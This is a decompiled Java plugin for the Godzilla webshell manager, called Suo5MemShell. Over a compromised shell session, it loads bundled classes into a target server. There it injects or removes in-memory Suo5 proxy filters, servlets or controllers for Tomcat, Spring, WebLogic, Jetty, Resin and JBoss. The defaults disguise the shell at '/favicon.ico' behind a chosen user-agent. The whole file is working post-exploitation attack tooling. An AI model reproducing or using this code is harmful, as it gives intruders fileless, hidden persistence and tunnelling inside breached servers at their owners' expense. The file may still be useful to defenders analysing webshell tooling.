/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="Suo5MemShell", DisplayName="Suo5MemShell")
public class Suo5MemShell
implements Plugin {
    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5SpringController", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter"};
    private static final String CLASS_NAME = "plugins.Suo5MemShell";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel urlPatternLabel = new JLabel("urlPattern: ");
    private final JLabel typeLabel = new JLabel("type: ");
    private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
    private final JLabel nameLabel = new JLabel("filterName/wrapperName: ");
    private final JTextField nameTextField = new JTextField("", 15);
    private final JLabel userAgentLabel = new JLabel("user-agent: ");
    private final JTextField userAgentTextField = new JTextField("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3", 20);
    private final JComboBox<String> typeComboBox = new JComboBox<String>(PROXY_TYPE);
    private final JButton injectButton = new JButton("inject");
    private final JButton removeButton = new JButton("remove");
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Suo5MemShell() {
        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.5, author: X1r0z\n");
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.urlPatternLabel);
        topPanel.add(this.urlPatternTextField);
        topPanel.add(this.nameLabel);
        topPanel.add(this.nameTextField);
        topPanel.add(this.userAgentLabel);
        topPanel.add(this.userAgentTextField);
        topPanel.add(this.typeLabel);
        topPanel.add(this.typeComboBox);
        topPanel.add(this.injectButton);
        topPanel.add(this.removeButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                Suo5MemShell.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void injectButtonClick(ActionEvent actionEvent) {
        try {
            String urlPattern = this.urlPatternTextField.getText();
            if (urlPattern.length() > 0) {
                InputStream inputStream;
                String proxyType = (String)this.typeComboBox.getSelectedItem();
                String name = this.nameTextField.getText();
                String userAgent = this.userAgentTextField.getText();
                String className = proxyType;
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("urlPattern", urlPattern);
                reqParameter.add("userAgent", userAgent);
                reqParameter.add("action", "inject");
                if (proxyType.equals("Suo5TomcatFilter")) {
                    inputStream = this.getClass().getResourceAsStream("assets/Suo5TomcatFilter.classs");
                    reqParameter.add("filterName", name);
                } else if (proxyType.equals("Suo5TomcatServlet")) {
                    inputStream = this.getClass().getResourceAsStream("assets/Suo5TomcatServlet.classs");
                    reqParameter.add("wrapperName", name);
                } else {
                    inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", proxyType));
                }
                byte[] classByteArray = functions.readInputStream(inputStream);
                inputStream.close();
                boolean loaderState = this.payload.include(className, classByteArray);
                if (loaderState) {
                    byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                    String resultString = this.encoding.Decoding(result);
                    Log.log(resultString, new Object[0]);
                    this.resultTextArea.append(String.format("injecting %s, urlPattern: %s, result: %s\n", proxyType, urlPattern, resultString));
                    this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                    GOptionPane.showMessageDialog(this.panel, "ok", "\u63d0\u793a", 1);
                } else {
                    GOptionPane.showMessageDialog(this.panel, "loader fail!", "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "url pattern is Null", "\u63d0\u793a", 2);
            }
        } catch (Exception var13) {
            Log.error(var13);
            GOptionPane.showMessageDialog(this.panel, var13.getMessage(), "\u63d0\u793a", 2);
        }
    }

    private void removeButtonClick(ActionEvent actionEvent) {
        try {
            String urlPattern = this.urlPatternTextField.getText();
            if (urlPattern.length() > 0) {
                InputStream inputStream;
                String proxyType = (String)this.typeComboBox.getSelectedItem();
                String name = this.nameTextField.getText();
                String userAgent = this.userAgentTextField.getText();
                String className = proxyType;
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("urlPattern", urlPattern);
                reqParameter.add("userAgent", userAgent);
                reqParameter.add("action", "remove");
                if (proxyType.equals("Suo5TomcatFilter")) {
                    inputStream = this.getClass().getResourceAsStream("assets/Suo5TomcatFilter.classs");
                    reqParameter.add("filterName", name);
                } else if (proxyType.equals("Suo5TomcatServlet")) {
                    inputStream = this.getClass().getResourceAsStream("assets/Suo5TomcatServlet.classs");
                    reqParameter.add("wrapperName", name);
                } else {
                    inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", proxyType));
                }
                byte[] classByteArray = functions.readInputStream(inputStream);
                inputStream.close();
                boolean loaderState = this.payload.include(className, classByteArray);
                if (loaderState) {
                    byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                    String resultString = this.encoding.Decoding(result);
                    Log.log(resultString, new Object[0]);
                    if (proxyType.equals("Suo5TomcatFilter")) {
                        this.resultTextArea.append(String.format("removing Suo5TomcatFilter, filterName: %s, urlPattern: %s, result: %s\n", name, urlPattern, resultString));
                    } else if (proxyType.equals("Suo5TomcatServlet")) {
                        this.resultTextArea.append(String.format("removing Suo5TomcatServlet, wrapperName: %s, urlPattern: %s, result: %s\n", name, urlPattern, resultString));
                    } else {
                        this.resultTextArea.append(String.format("removing %s, urlPattern: %s, result: %s\n", proxyType, urlPattern, resultString));
                    }
                    GOptionPane.showMessageDialog(this.panel, "ok", "\u63d0\u793a", 1);
                } else {
                    GOptionPane.showMessageDialog(this.panel, "loader fail!", "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "url pattern is Null", "\u63d0\u793a", 2);
            }
        } catch (Exception var13) {
            Log.error(var13);
            GOptionPane.showMessageDialog(this.panel, var13.getMessage(), "\u63d0\u793a", 2);
        }
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

